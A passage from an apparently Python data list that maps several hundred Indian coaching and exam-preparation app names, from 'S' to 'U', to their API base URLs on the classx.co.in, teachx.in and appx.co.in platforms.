    ("Sciencetechnologybydrsantosh", "https://sciencetechnologydrsantoshapi.classx.co.in"),
    ("Scmagnet", "https://sciencemagnetapi.classx.co.in"),
    ("Sctacademy", "https://sctacademyapi.classx.co.in"),
    ("Sdcampus", "https://sdcampusapi.classx.co.in"),
    ("Sdcareer", "https://sdcareerapi.classx.co.in"),
    ("Selection", "https://selectionguruapi.classx.co.in"),
    ("Selectionacademy", "https://selectionacademyapi.classx.co.in"),
    ("Selectionboardacademy", "https://selectionboardacademyapi.classx.co.in"),
    ("Selectionboardjaipur", "https://selectionboardjaipurapi.classx.co.in"),
    ("Selectiondarbar", "https://selectiondarbarapi.classx.co.in"),
    ("Selectiondunia", "https://selectionduniaapi.classx.co.in"),
    ("Selectiongurukul", "https://selectiongurukulapi.classx.co.in"),
    ("Selectionhub", "https://selectionhubapi.classx.co.in"),
    ("Selectionshala", "https://selectionshalaapi.classx.co.in"),
    ("Selectiontak", "https://selectiontakapi.classx.co.in"),
    ("Selectiontaknew", "https://selectiontakmpapi.classx.co.in"),
    ("Selectionwarrior", "https://selectionwarriorapi.classx.co.in"),
    ("Serenepathsala", "https://serenepathshalaapi.classx.co.in"),
    ("Sgacademy", "https://sgacademyapi.classx.co.in"),
    ("Sgcommerceclasses", "https://sgcommerceclassesapi.classx.co.in"),
    ("Shahidsirseducationpoint", "https://shahidsirseducationpointapi.classx.co.in"),
    ("Shaileshclasses", "https://shaileshclassesapi.classx.co.in"),
    ("Sharadcoachingclasses", "https://sharadcoachingclassesapi.classx.co.in"),
    ("Sharadsenglishclubpune", "https://sharadsenglishclubpuneapi.classx.co.in"),
    ("Shardaexam", "https://shardaexamapi.classx.co.in"),
    ("Shardeclassesnokha", "https://shardeclassesnokhaapi.classx.co.in"),
    ("Sharmaclassesjodhpurshikshaguru", "https://sharmaclassesjodhpurapi.classx.co.in"),
    ("Shashankdefenceacademy", "https://shashankdefenceacademyapi.classx.co.in"),
    ("Shikharclassroom", "https://shikharclassroomapi.classx.co.in"),
    ("Shikhareducation", "https://shikhareducationapi.classx.co.in"),
    ("Shikhareducationresearchcentre", "https://shikhareducationresearchcentreapi.classx.co.in"),
    ("Shikharsthelearningapp", "https://shikharslearningapi.classx.co.in"),
    ("Shiksha", "https://shikshapathapi.classx.co.in"),
    ("Shikshadham", "https://shikshadhamdelhiapi.classx.co.in"),
    ("Shikshadhamofficialwinning", "https://shikshadhamofficialapi.classx.co.in"),
    ("Shikshakul", "https://shikshakulapi.classx.co.in"),
    ("Shikshasamagam", "https://shikshasamagamapi.classx.co.in"),
    ("Shikshayuglive", "https://shikshayugliveapi.classx.co.in"),
    ("Shineindiagroupsacademy", "https://shineindiagroupsacademyapi.classx.co.in"),
    ("Shinusingh", "https://shinusinghapi.classx.co.in"),
    ("Shivaclassesbiharagriculture", "https://shivaclassesbiharagricultureapi.classx.co.in"),
    ("Shivajinimat", "https://shivajinimatapi.classx.co.in"),
    ("Shivcoachingclasses", "https://shivcoachingclassesapi.classx.co.in"),
    ("Shivikakipathshala", "https://shivikakipathshalaapi.classx.co.in"),
    ("Shivzmusic", "https://shivzmusicapi.classx.co.in"),
    ("Shomusbiology", "https://shomusbiologyapi.classx.co.in"),
    ("Shreeacademy", "https://shreeacademyapi.classx.co.in"),
    ("Shreebalajinursingacademy", "https://shreebalajinursingacademyapi.classx.co.in"),
    ("Shreeclasses", "https://shreeclassesapi.classx.co.in"),
    ("Shreeenglish", "https://shreeenglishapi.classx.co.in"),
    ("Shreeganeshclasses", "https://shreeganeshclassesapi.classx.co.in"),
    ("Shreejipratyekam", "https://shreejipratyekamapi.classx.co.in"),
    ("Shreejistudycentre", "https://shreejistudycentreapi.classx.co.in"),
    ("Shreejitraders", "https://shreejitradersapi.classx.co.in"),
    ("Shreeramclasses", "https://shreeramclassesapi.classx.co.in"),
    ("Shreeramedumitra", "https://shreeramedumitraapi.classx.co.in"),
    ("Shrenikjainengineeringsimplified", "https://engineeringsimplifiedapi.classx.co.in"),
    ("Shreshthclasses", "https://shreshthclassesapi.classx.co.in"),
    ("Shreyajeeacademy", "https://shreyajeeacademyapi.classx.co.in"),
    ("Shubhamclasses", "https://shubhamclassesapi.classx.co.in"),
    ("Shubhameclasses", "https://shubhameclassesapi.classx.co.in"),
    ("Shubhamjagdish", "https://shubhamjagdishapi.classx.co.in"),
    ("Shubhiasacademy", "https://shubhiasacademyapi.classx.co.in"),
    ("Shuklaclassesdelhi", "https://shuklaclassesdelhiapi.classx.co.in"),
    ("Siddhantuedutech", "https://siddhantuedutechapi.classx.co.in"),
    ("Sigmaacademybyhemant", "https://sigmaacademyhemantapi.classx.co.in"),
    ("Sigmaclassesedutube", "https://sigmaclassesapi.classx.co.in"),
    ("Sigmaias", "https://sigmaiasapi.classx.co.in"),
    ("Sikarclasses", "https://sikarclassesapi.classx.co.in"),
    ("Sikhwalonlinehubjaipur", "https://sikhwalonlinehubapi.classx.co.in"),
    ("Simplifysuccess", "https://simplifysuccessapi.classx.co.in"),
    ("Simplifyuppsc", "https://simplifyuppscapi.classx.co.in"),
    ("Simplifyupscmpsc", "https://simplifyupscmpscapi.classx.co.in"),
    ("Simsnapclinic", "https://simsnapclinicapi.classx.co.in"),
    ("Singhinusa", "https://singhusaapi.classx.co.in"),
    ("Singhkorieducation", "https://singhkorieducationapi.classx.co.in"),
    ("Singhsahab", "https://singhsahabapi.classx.co.in"),
    ("Sirodiatestseriesapp", "https://sirodiatestseriesappapi.classx.co.in"),
    ("Sitachoudharyhistory", "https://sitachoudharyhistoryapi.classx.co.in"),
    ("Sivapallipsychology", "https://sivapallipsychologyapi.classx.co.in"),
    ("Siwalclasses", "https://siwalclassesapi.classx.co.in"),
    ("Sjnacademy", "https://sjnacademyapi.classx.co.in"),
    ("Skanclasses", "https://skanclassesapi.classx.co.in"),
    ("Skclass", "https://skclassappapi.classx.co.in"),
    ("Skeducationlive", "https://skeducationliveapi.classx.co.in"),
    ("Skilladda", "https://skilladdaapi.classx.co.in"),
    ("Skillupacademy", "https://skillupacademyapi.classx.co.in"),
    ("Skilluptech", "https://skilluptechapi.classx.co.in"),
    ("Skillverse", "https://skillverseapi.classx.co.in"),
    ("Skmathreasoning", "https://skmathreasoningapi.classx.co.in"),
    ("Skmstudy", "https://skmstudyapi.classx.co.in"),
    ("Sknayakclasses", "https://sknayakclassesapi.classx.co.in"),
    ("Skpatelsiasacademy", "https://skpatelsiasacademyapi.classx.co.in"),
    ("Skpolity", "https://skpolityapi.classx.co.in"),
    ("Sksrivastava", "https://sksrivastavaapi.classx.co.in"),
    ("Skyeducare", "https://skyeducareapi.classx.co.in"),
    ("Smartbookstore", "https://smartbookstoreapi.classx.co.in"),
    ("Smarteducationcenter", "https://smarteducationcenterapi.classx.co.in"),
    ("Smartmpscwala", "https://smartmpscwalaapi.classx.co.in"),
    ("Smartnotes", "https://smartnotesapi.classx.co.in"),
    ("Smartrankers", "https://smartrankersapi.classx.co.in"),
    ("Smartstudyclassespro", "https://smartstudyclassesproapi.classx.co.in"),
    ("Smartstudyfoundation", "https://smartstudyfoundationapi.classx.co.in"),
    ("Smartstudyras", "https://smartstudyrasapi.classx.co.in"),
    ("Smbis", "https://smbisapi.classx.co.in"),
    ("Smsinstitute", "https://smsinstituteapi.classx.co.in"),
    ("Sneakclub", "https://sneakclubapi.classx.co.in"),
    ("Softstudy", "https://softstudyapi.classx.co.in"),
    ("Solusacademy", "https://solusacademyapi.classx.co.in"),
    ("Sonuarmyclasses", "https://sonuarmyclassesapi.classx.co.in"),
    ("Sonusirclasses", "https://sonusirclassesapi.classx.co.in"),
    ("Soonyaacademylearnerapp", "https://soonyaacademylearnerapi.classx.co.in"),
    ("Spaceclasses", "https://spaceclassesapi.classx.co.in"),
    ("Spaceias", "https://spaceiasapi.teachx.in"),
    ("Spaceiasacademy", "https://spaceiasapi.classx.co.in"),
    ("Spacetutor", "https://spacetutorapi.classx.co.in"),
    ("Spandanias", "https://spandaniasapi.classx.co.in"),
    ("Spaneducation", "https://spaneducationapi.classx.co.in"),
    ("Spardhagram", "https://spardhagramapi.classx.co.in"),
    ("Spardhalines", "https://spardhalinesapi.classx.co.in"),
    ("Spardhaniti", "https://spardhanitiapi.classx.co.in"),
    ("Spardhapariksha", "https://spardhaparikshaapi.classx.co.in"),
    ("Spardhaparikshaupdate", "https://spardhaparikshaupdateapi.classx.co.in"),
    ("Sparkleeducation", "https://sparkleeducationapi.classx.co.in"),
    ("Sparkleeducationwithgaurav", "https://sparkleeducationgauravapi.classx.co.in"),
    ("Speakfluentlyankushpare", "https://speakfluentlyankushpareapi.classx.co.in"),
    ("Speakingchalks", "https://speakingchalksapi.classx.co.in"),
    ("Spectrumacademy", "https://spectrumacademyapi.classx.co.in"),
    ("Speedycurrentaffairsgk", "https://speedycurrentaffairsgkapi.classx.co.in"),
    ("Speedystudy", "https://speedstudyapi.classx.co.in"),
    ("Spguruagriculture", "https://spguruagricultureapi.classx.co.in"),
    ("Spmiasacademy", "https://spmiasacademyapi.classx.co.in"),
    ("Squaredice", "https://squarediceapi.classx.co.in"),
    ("Sreedharsstudies", "https://sreedharsstudiesapi.classx.co.in"),
    ("Sricompetitiveforum", "https://sricompetitiveforumapi.classx.co.in"),
    ("Sridhi", "https://sridhiapi.classx.co.in"),
    ("Srigayatriteluguacademy", "https://srigayatriteluguacademyapi.classx.co.in"),
    ("Srihanacademyneetjee", "https://srihanacademyapi.classx.co.in"),
    ("Srinivasmech", "https://srinivasmechapi.classx.co.in"),
    ("Srisaiacademy", "https://srisaiacademyapi.classx.co.in"),
    ("Srisaitutorial", "https://srisaitutorialapi.classx.co.in"),
    ("Srisatyaacademy", "https://srisatyaacademyapi.classx.co.in"),
    ("Srishailinypublications", "https://srishailinyapi.classx.co.in"),
    ("Sristiedu", "https://sristieduapi.classx.co.in"),
    ("Srkt", "https://srktacademyapi.teachx.in"),
    ("Srktacademy", "https://srktacademyapi.classx.co.in"),
    ("Srmacademy", "https://srmacademyapi.classx.co.in"),
    ("Ss", "https://sandsappapi.classx.co.in"),
    ("Ssacademy", "https://ssacademyapi.classx.co.in"),
    ("Ssbguide", "https://ssbguideapi.classx.co.in"),
    ("Ssbworld", "https://ssbworldapi.classx.co.in"),
    ("Sscgurukul", "https://ssggurukulapi.appx.co.in"),
    ("Sschsczone", "https://sschsczoneapi.classx.co.in"),
    ("Sscmakerexampreparation", "https://sscmakerexampreparationapi.classx.co.in"),
    ("Ssctelugu", "https://sscteluguapi.classx.co.in"),
    ("Sspathshala", "https://sspathshalaapi.classx.co.in"),
    ("Ssrganeshtelugu", "https://ssrganeshteluguapi.classx.co.in"),
    ("Sstbyanupamsir", "https://sstanupamsirapi.classx.co.in"),
    ("Sstpoint", "https://sstpointapi.classx.co.in"),
    ("Stariqeducation", "https://stariqeducationapi.classx.co.in"),
    ("Starmathematics", "https://starmathematicsapi.classx.co.in"),
    ("Stashokparwar", "https://sciencetechnologyenvironmentashokpawarapi.classx.co.in"),
    ("Stbgofficial", "https://stbgofficialapi.classx.co.in"),
    ("Stenoshala_bad", "https://stenoshalaapi.classx.co"),
    ("Stenoshala", "https://stenoshalaapi.classx.co.in"),
    ("Stenoshalalearnshorthand", "https://stenoshalalearnshorthandeaseapi.classx.co.in"),
    ("Stiravindramane", "https://stiravindramaneapi.classx.co.in"),
    ("Stockburner", "https://stockburnerapi.classx.co.in"),
    ("Studento", "https://studentoapi.classx.co.in"),
    ("Studentscampus", "https://studentscampusapi.classx.co.in"),
    ("Study2Achieve", "https://study2achieveapi.classx.co.in"),
    ("Study8Home", "https://study8homeapi.classx.co.in"),
    ("Studyadda", "https://studyaddaapi.classx.co.in"),
    ("Studybharat", "https://studybharatapi.classx.co.in"),
    ("Studybypathaksir", "https://studypathaksirapi.classx.co.in"),
    ("Studycapitalcuetschoolprep", "https://studycapitalcuetschoolprepapi.classx.co.in"),
    ("Studychampionacademy", "https://studychampionacademyapi.classx.co.in"),
    ("Studycomofficial", "https://studycomofficialapi.classx.co.in"),
    ("Studydotcom", "https://studydotcomapi.classx.co.in"),
    ("Studyexamacademy", "https://studyexamacademyapi.classx.co.in"),
    ("Studyforcareer", "https://studyforcareerapi.classx.co.in"),
    ("Studygurupathshala", "https://studygurupathshalaapi.classx.co.in"),
    ("Studyhubkuchamancity", "https://studyhubkuchamancityapi.classx.co.in"),
    ("Studyhubpune", "https://studyhubpuneapi.classx.co.in"),
    ("Studyindiaadda", "https://studyindiaaddaapi.classx.co.in"),
    ("Studykar", "https://studykarapi.classx.co.in"),
    ("Studylab_appx", "https://learnamanbarkhaapi.appx.co.in"),
    ("Studylive", "https://studyliveapi.classx.co.in"),
    ("Studylivenavnathsir", "https://studylivenavnathsirapi.classx.co.in"),
    ("Studyloverveer", "https://studyloverveerapi.classx.co.in"),
    ("Studymantra", "https://studymantraapi.classx.co.in"),
    ("Studymantramns", "https://studymantramnsapi.classx.co.in"),
    ("Studynitijaiibcaiib", "https://studynitiapi.classx.co.in"),
    ("Studynow", "https://studynowapi.classx.co.in"),
    ("Studyofeducation", "https://studyofeducationapi.classx.co.in"),
    ("Studyonacademy", "https://studyonacademyapi.classx.co.in"),
    ("Studyonline", "https://studyonlineapi.classx.co.in"),
    ("Studypanel", "https://studypanelapi.classx.co.in"),
    ("Studypass", "https://studypassapi.classx.co.in"),
    ("Studypie", "https://studypieapi.classx.co.in"),
    ("Studypillar", "https://studypillarapi.classx.co.in"),
    ("Studyplanet", "https://studyplanetapi.classx.co.in"),
    ("Studypoint", "https://dheryastudypointapi.classx.co.in"),
    ("Studypointwithnigamsir", "https://studypointwithnigamsirapi.classx.co.in"),
    ("Studyshala20", "https://studyshala20api.classx.co.in"),
    ("Studysyllabus", "https://studysyllabusapi.classx.co.in"),
    ("Studytimebangla", "https://studytimebanglaapi.classx.co.in"),
    ("Studytricks", "https://studytricksapi.classx.co.in"),
    ("Studyupacademypune", "https://studyupacademypuneapi.classx.co.in"),
    ("Studyvikram", "https://studyvikramapi.classx.co.in"),
    ("Studywadi", "https://studywadiapi.classx.co.in"),
    ("Studyway", "https://studywayapi.classx.co.in"),
    ("Studywithbhai", "https://mathswithsumitbhaiapi.classx.co.in"),
    ("Studywithdedicationswd", "https://studywithdedicationapi.classx.co.in"),
    ("Studywithiclm", "https://studyiclmapi.classx.co.in"),
    ("Studywithjs", "https://studywithjsapi.classx.co.in"),
    ("Studywithmanita", "https://studymanitaapi.classx.co.in"),
    ("Studywithmk", "https://studymkapi.classx.co.in"),
    ("Studywithritesh", "https://studyriteshapi.classx.co.in"),
    ("Studywithsmriti", "https://studysmritiapi.classx.co.in"),
    ("Successacademyjamkhandi", "https://successacademyjamkhandiapi.classx.co.in"),
    ("Successcareer", "https://successcareerapi.classx.co.in"),
    ("Successcentresikar", "https://successcentresikarapi.classx.co.in"),
    ("Successforum", "https://successforumapi.classx.co.in"),
    ("Successgyanclasses", "https://successgyanclassesapi.classx.co.in"),
    ("Successicon", "https://successiconapi.classx.co.in"),
    ("Successmantrabydeepakrai", "https://successmantraapi.classx.co.in"),
    ("Successmathematics", "https://successmathematicsapi.classx.co.in"),
    ("Successplanet20", "https://successplanet20api.classx.co.in"),
    ("Successpoint", "https://successpointapi.classx.co.in"),
    ("Successseries_mumbai", "https://successseriesmumbaiapi.classx.co.in"),
    ("Successseries", "https://successseriesapi.classx.co.in"),
    ("Successsquare", "https://successsquareapi.classx.co.in"),
    ("Successstenotyping", "https://successstenotypingapi.classx.co.in"),
    ("Sumitacademy", "https://sumitacademyapi.classx.co.in"),
    ("Sumitjhambclasses", "https://sumitjhambclassesapi.classx.co.in"),
    ("Sumitsirclasseslive", "https://sumitsirclassesapi.classx.co.in"),
    ("Sunlight", "https://sunlightapi.classx.co.in"),
    ("Sunyapcs", "https://sunyapcsapi.classx.co.in"),
    ("Supercenturyacademy", "https://supercenturyacademyapi.classx.co.in"),
    ("Superclimaxacademysca", "https://superclimaxacademyapi.classx.co.in"),
    ("Supernotes", "https://supernotesapi.classx.co.in"),
    ("Sureias", "https://sureiasapi.classx.co.in"),
    ("Sureshbabusir", "https://sureshbabusirapi.classx.co.in"),
    ("Sureshbanking20", "https://sureshbankingapi.classx.co.in"),
    ("Sureshsirclasses", "https://sureshsirclassesapi.classx.co.in"),
    ("Sureshsirscompetitiveclasses", "https://sureshsirscompetitiveclassesapi.classx.co.in"),
    ("Surgerydada", "https://surgerydadaapi.classx.co.in"),
    ("Suryainstitute", "https://suryainstituteapi.classx.co.in"),
    ("Suryanagriuniquelawclasses", "https://suryanagriuniquelawclassesapi.classx.co.in"),
    ("Suryaschool", "https://suryaschoolapi.classx.co.in"),
    ("Suryavanshamgurukul", "https://suryavanshamgurukulapi.classx.co.in"),
    ("Sushenmaharajnaikawade", "https://sushenmaharajnaikawadeapi.classx.co.in"),
    ("Svijharkhand", "https://svijharkhandapi.classx.co.in"),
    ("Swadhyayacademy", "https://swadhyayacademyapi.classx.co.in"),
    ("Swadhyayprabodhini", "https://swadhyayprabodhiniapi.classx.co.in"),
    ("Swaeducation", "https://swaeducationapi.classx.co.in"),
    ("Swaminathanagriinstitute", "https://swaminathanagriinstitutejaipurapi.classx.co.in"),
    ("Swamivivekanandainschool", "https://swamivivekanandainternationalschoolapi.classx.co.in"),
    ("Swamivivekanandinstitute", "https://swamivivekanandinstituteapi.classx.co.in"),
    ("Swapnastudies", "https://swapnastudiesapi.classx.co.in"),
    ("Swarajyaacademyomsir", "https://swarajyaacademyomsirapi.classx.co.in"),
    ("Swarajyacareeracademy", "https://swarajyacareeracademyapi.classx.co.in"),
    ("Swastikclasses", "https://swastikclassesapi.classx.co.in"),
    ("Taksh", "https://takshappapi.classx.co.in"),
    ("Talent", "https://talentplusapi.classx.co.in"),
    ("Talentacademyliscentre", "https://talentacademyliscentreapi.classx.co.in"),
    ("Tallyclass", "https://tallyclassapi.classx.co.in"),
    ("Tamilsolaiacademy", "https://tamilsolaiacademyapi.classx.co.in"),
    ("Tandavclasses", "https://tandavclassesapi.classx.co.in"),
    ("Tapasyapcs", "https://tapasyapcsapi.classx.co.in"),
    ("Targetcombine", "https://targetcombineapi.classx.co.in"),
    ("Targetdefenceacademy", "https://targetdefenceacademyapi.classx.co.in"),
    ("Targetforiq", "https://targetforiqapi.classx.co.in"),
    ("Targetgpat", "https://targetgpatapi.classx.co.in"),
    ("Targetgurukul", "https://targetgurukulapi.classx.co.in"),
    ("Targetplus", "https://targetplusapi.classx.co.in"),
    ("Targetsarkarinaukari", "https://targetsarkarinaukriapi.classx.co.in"),
    ("Targetstudyiq", "https://targetstudyiqapi.classx.co.in"),
    ("Targetupsc", "https://targetupscapi.classx.co.in"),
    ("Targetwill", "https://targetwillapi.classx.co.in"),
    ("Targetwithajaysir", "https://targetwithajaysirapi.classx.co.in"),
    ("Targetwithankit", "https://targetwithankitapi.classx.co.in"),
    ("Targetwithbhavikmaru", "https://targetbhavikmaruapi.classx.co.in"),
    ("Targetwithbhavikmarunew", "https://targetwithbhavikmaruapi.classx.co.in"),
    ("Tathagatgsprep", "https://tathagatgsprepapi.classx.co.in"),
    ("Tcsexam", "https://tcsexamzoneapi.classx.co.in"),
    ("Teacheracademy", "https://teacheracademyapi.classx.co.in"),
    ("Teachersacademykng", "https://teachersacademykngapi.classx.co.in"),
    ("Teachersachievers", "https://teachersachieversapi.classx.co.in"),
    ("Teacherselectacademy", "https://teacherselectacademyapi.classx.co.in"),
    ("Teachersexpressofficial", "https://teachersexpressofficialapi.classx.co.in"),
    ("Teachersgurukul", "https://teachersgurukulapi.classx.co.in"),
    ("Teachersmantra", "https://teachersmantraapi.classx.co.in"),
    ("Teachersway", "https://teacherswayapi.classx.co.in"),
    ("Teachextra", "https://teachextraapi.classx.co.in"),
    ("Teachingoriented", "https://teachingorientedapi.classx.co.in"),
    ("Teachingpariksha", "https://teachingparikshaapi.classx.co.in"),
    ("Techcapsule", "https://techcapsuleapi.classx.co.in"),
    ("Techelitelive", "https://techeliteliveapi.classx.co.in"),
    ("Techhubclasses", "https://techhubclassesapi.classx.co.in"),
    ("Techiesms", "https://techiesmsapi.classx.co.in"),
    ("Techmechanicalelectrical", "https://techmechanicalelectricalapi.classx.co.in"),
    ("Technicaljobgyan", "https://technicaljobgyanapi.classx.co.in"),
    ("Technogateeducation", "https://technogateeducationapi.classx.co.in"),
    ("Techstudyiti", "https://techstudyitiapi.classx.co.in"),
    ("Techtech", "https://techtechapi.classx.co.in"),
    ("Teejanshpathshala", "https://teejanshpathshalaapi.classx.co.in"),
    ("Tegonity", "https://tegonityapi.classx.co.in"),
    ("Tejaswigovernmentexams", "https://tejaswigovernmentexamsapi.classx.co.in"),
    ("Telugurailways", "https://telugurailwaysapi.classx.co.in"),
    ("Tempdb", "https://tempapi.classx.co.in"),
    ("Test247", "https://test247api.classx.co.in"),
    ("Testcreds", "https://testcredsapi.classx.co.in"),
    ("Testfactory", "https://testfactoryapi.classx.co.in"),
    ("Testingmigration", "https://testingmigrationapi.classx.co.in"),
    ("Testpaper", "https://testpaperapi.classx.co.in"),
    ("Testpass", "https://thetestpassapi.classx.co.in"),
    ("Testplace", "https://testplaceapi.classx.co.in"),
    ("Testprep", "https://thetestprepapi.classx.co.in"),
    ("Testpur", "https://testpurapi.classx.co.in"),
    ("Testwala", "https://testwalaapi.classx.co.in"),
    ("Testyourtaiyarimind4Academy", "https://testyourtaiyariapi.classx.co.in"),
    ("Tharunspeaks", "https://tharunspeaksapi.classx.co.in"),
    ("Theachievesmentorship", "https://theachievesmentorshipapi.classx.co.in"),
    ("Theakacademy", "https://akacademyapi.classx.co.in"),
    ("Theananteducation", "https://ananteducationapi.classx.co.in"),
    ("Theapronboy", "https://apronboyapi.classx.co.in"),
    ("Thearmyboy", "https://thearmyboyapi.classx.co.in"),
    ("Theboardsacademy", "https://theboardsacademyapi.classx.co.in"),
    ("Thecivilindiaofficial", "https://civilindiaofficialapi.classx.co.in"),
    ("Thecivilsclub", "https://civilsclubapi.classx.co.in"),
    ("Thecoach", "https://thecoachapi.classx.co.in"),
    ("Thecodeskool", "https://thecodeskoolapi.classx.co.in"),
    ("Thecodingbus", "https://codingbusapi.classx.co.in"),
    ("Theconceptualias", "https://theconceptualiasapi.classx.co.in"),
    ("Thecoreacademy", "https://coreacademyapi.classx.co.in"),
    ("Thedepartment", "https://thedepartmentapi.classx.co.in"),
    ("Theeducationadda", "https://educationaddaapi.classx.co.in"),
    ("Thegrmacademy", "https://grmacademyapi.classx.co.in"),
    ("Thehistoricaias", "https://historicaiasapi.classx.co.in"),
    ("Theimaiasras", "https://imaiasrasapi.classx.co.in"),
    ("Thekpsharmaexamsprep", "https://kpsharmaexamsprepapi.classx.co.in"),
    ("Thelastexam", "https://lastexamapi.teachx.in"),
    ("Thelifistudy", "https://lifistudyapi.classx.co.in"),
    ("Thelionacademy", "https://lionacademyapi.classx.co.in"),
    ("Thelyceum", "https://lyceumapi.classx.co.in"),
    ("Themathscafe", "https://mathscafeapi.classx.co.in"),
    ("Thembbsplanet", "https://mbbsplanetapi.classx.co.in"),
    ("Thementors", "https://thementorsapi.classx.co.in"),
    ("Themotionclasses", "https://themotionclassesapi.classx.co.in"),
    ("Thenayakacademyamravati", "https://nayakacademyamravatiapi.classx.co.in"),
    ("Thenpibuxar", "https://npibuxarapi.classx.co.in"),
    ("Theofficersacadem", "https://theofficersacademyapi.classx.co.in"),
    ("Theofficersacademy_appx", "https://theofficersacademyapi.appx.co.in"),
    ("Theoryofphysics", "https://theoryphysicsapi.classx.co.in"),
    ("Theparikshanitiacademy", "https://parikshanitiacademyapi.classx.co.in"),
    ("Thephidiasacademy", "https://phidiasacademyapi.classx.co.in"),
    ("Thephoenixacademypune", "https://phoenixacademypuneapi.classx.co.in"),
    ("Theplatform", "https://platformapi.classx.co.in"),
    ("Theplatform2O", "https://theplatformapi.classx.co.in"),
    ("Thepremieracademy", "https://thepremieracademyapi.classx.co.in"),
    ("Theprimeacademy", "https://theprimeacademyapi.classx.co.in"),
    ("Therasayanam", "https://therasayanamapi.classx.co.in"),
    ("Thesamarthacademy", "https://thesamarthacademyapi.classx.co.in"),
    ("Theschooleducationadda", "https://schooleducationaddaapi.classx.co.in"),
    ("Thesciencelaserbysumitshukla", "https://sciencelasersumitshuklaapi.classx.co.in"),
    ("Theselectionguru", "https://theselectionguruapi.classx.co.in"),
    ("Thesmartstudy", "https://thesmartstudyapi.classx.co.in"),
    ("Thespeed", "https://speedcoachingapi.teachx.in"),
    ("Thespeedcoaching", "https://speedcoachingapi.classx.co.in"),
    ("Thestudyline", "https://thestudylineapi.classx.co.in"),
    ("Thetargetdreamitchaseit", "https://thetargetapi.classx.co.in"),
    ("Theteacher", "https://theteacherapi.classx.co.in"),
    ("Thevectoracademy", "https://vectoracademyapi.classx.co.in"),
    ("Thevijeeshacademy", "https://vijeeshacademyapi.classx.co.in"),
    ("Thewinnersacademy", "https://thewinnersacademyapi.classx.co.in"),
    ("Thinkias", "https://thinkiasapi.classx.co.in"),
    ("Thinkssc", "https://thinksscapi.classx.co.in"),
    ("Tikkarmarathi", "https://tikkarmarathiapi.classx.co.in"),
    ("Timeforgreatness", "https://timegreatnessapi.classx.co.in"),
    ("Timelineeducation", "https://timelineeducationapi.classx.co.in"),
    ("Tirupatiiasbhopal", "https://tirupatiiasbhopalapi.classx.co.in"),
    ("Tiwaricampus", "https://tiwaricampusapi.classx.co.in"),
    ("Tkpacademy", "https://tkpacademyapi.classx.co.in"),
    ("Tnacademylearningapp", "https://tnacademylearningapi.classx.co.in"),
    ("Tnicollegeofcompetitions", "https://tnicollegecompetitionsapi.classx.co.in"),
    ("Toc", "https://toclearningapi.teachx.in"),
    ("Toclearningapp", "https://toclearningapi.classx.co.in"),
    ("Toothpracto", "https://toothpractoapi.classx.co.in"),
    ("Toppers24", "https://toppers24inapi.classx.co.in"),
    ("Toppersadda", "https://studymateapi.classx.co.in"),
    ("Toppersinitiative", "https://toppersinitiativeapi.classx.co.in"),
    ("Topperstest", "https://topperstestapi.classx.co.in"),
    ("Toppertemple", "https://toppertempleapi.classx.co.in"),
    ("Topsthan", "https://topsthanapi.classx.co.in"),
    ("Toptak", "https://rahuldeshwalacademyapi.appx.co.in"),
    ("Totallearning", "https://totallearningapi.classx.co.in"),
    ("Tradingkulture", "https://tradingkultureapi.classx.co.in"),
    ("Trendtutor", "https://trendtutorapi.classx.co.in"),
    ("Trickyacademyno1", "https://trickyacademyno1api.classx.co.in"),
    ("Trinetraias", "https://trinetraiasapi.classx.co.in"),
    ("Trinity", "https://trinityapi.classx.co.in"),
    ("Tripbohemia", "https://tripbohemiaapi.classx.co.in"),
    ("Triplingphysic", "https://triplingphysicsapi.classx.co.in"),
    ("Trishakti", "https://trishaktiapi.classx.co.in"),
    ("Trueiq", "https://trueiqapi.classx.co.in"),
    ("Tsbaditetdsc", "https://tsbaditetdscapi.classx.co.in"),
    ("Tsironlineclasses", "https://tsironlineclassesapi.classx.co.in"),
    ("Tslnursingcoaching", "https://tslnursingcoachingapi.classx.co.in"),
    ("Tubeenglish", "https://tubeenglishapi.classx.co.in"),
    ("Tuitiongharofficial", "https://tuitiongharofficialapi.classx.co.in"),
    ("Turningpointvijayamcompetitiveexams", "https://turningpointapi.classx.co.in"),
    ("Tutoralearningapp", "https://tutoralearningappapi.classx.co.in"),
    ("Tutorizeacademy", "https://tutorizeacademyapi.classx.co.in"),
    ("Tutorsadda", "https://tutorsaddaapi.classx.co.in"),
    ("Tutosadda", "https://tutorsaddaapi.teachx.in"),
    ("Twelthplus", "https://plus12thapi.classx.co.in"),
    ("Twelveminutestoclat", "https://minutes12toclatapi.classx.co.in"),
    ("Twentyfourhrsstudycentre", "https://24hrsstudycentreapi.classx.co.in"),
    ("Twsacademy", "https://twsacademyapi.classx.co.in"),
    ("Uascareerinstitute", "https://uascareerinstituteapi.classx.co.in"),
    ("Ucananenglishacademy", "https://ucanenglishacademyapi.classx.co.in"),
    ("Uclive", "https://ucliveapi.classx.co.in"),
    ("Udaaninstitute", "https://udaaninstituteapi.classx.co.in"),
    ("Udaaninstituteofexcellence", "https://udaaninstituteexcellencenandedapi.classx.co.in"),
    ("Udaicareeracademy", "https://udaicareeracademyapi.classx.co.in"),
    ("Udaipurclasses", "https://udaipurclassesapi.classx.co.in"),
    ("Udaykadamsmarathiacademy", "https://udaykadamsmarathiacademyapi.classx.co.in"),
    ("Udbhavaacademy", "https://udbhavaacademyapi.classx.co.in"),
    ("Ufjapp", "https://ufjappapi.classx.co.in"),
    ("Ujjwalclasses", "https://ujjwalclassesapi.classx.co.in"),
    ("Ujjwalclassesrajasthan", "https://ujjwalclassesrajasthanapi.classx.co.in"),
    ("Umaiiasacademy", "https://umaiiasacademyapi.classx.co.in"),
    ("Umangcareeracademy", "https://umangcareeracademyapi.classx.co.in"),
    ("Umangstudy", "https://umangstudyapi.classx.co.in"),
    ("Umaudaanmasteracademy", "https://umaudaanmasteracademyapi.classx.co.in"),
    ("Umediasacademy", "https://umediasacademyapi.classx.co.in"),
    ("Umedmpsc", "https://umedmpscapi.classx.co.in"),
    ("Umeshsharmaacademy", "https://umeshsharmaacademyapi.classx.co.in"),
    ("Uniexamsshiksha", "https://uniexamsshikshaapi.classx.co.in"),
    ("Unifoxconnected", "https://unifoxconnectedapi.classx.co.in"),
    ("Unifystudy", "https://unifystudyapi.classx.co.in"),
    ("Uniqueacademy", "https://uniqueacademyapi.classx.co.in"),
    ("Uniquecivil", "https://uniquecivilapi.classx.co.in"),
    ("Uniquegyanofficial", "https://uniquegyanofficialapi.classx.co.in"),
    ("Uniqueonlineclasses", "https://uniqueonlineclassesapi.classx.co.in"),
    ("Uniquephysics", "https://uniquephysicsapi.classx.co.in"),
